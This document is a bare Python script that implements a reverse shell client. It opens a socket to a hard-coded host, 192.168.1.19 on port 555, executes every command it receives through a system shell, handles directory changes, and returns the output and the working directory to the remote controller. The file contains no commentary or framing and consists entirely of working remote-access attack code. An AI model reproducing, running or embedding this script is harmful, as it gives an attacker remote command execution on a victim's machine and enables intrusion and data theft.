import socket
import subprocess
import os

host = '192.168.1.19'
port = 555

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(bytes(os.getcwd(), encoding='utf-8') + bytes(' : ', encoding=('utf-8')))

while True:
    command = s.recv(1024)
    process = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
    out = process.stdout.read() + process.stderr.read()

    if str(command[:2].decode()) == 'cd':
        if os.path.exists(command[3:].replace(b'\n', b'')):
            os.chdir(command[3:].replace(b'\n', b''))
        s.send(bytes(os.getcwd(), encoding='utf-8') + bytes(' : ', encoding=('utf-8')))
                   
    elif str(command[:4].decode()) ==  'exit':
        s.close()
        break
    else:
        data = out + bytes(os.getcwd(), encoding='utf-8') + bytes(' : ', encoding=('utf-8'))
        s.send(data)
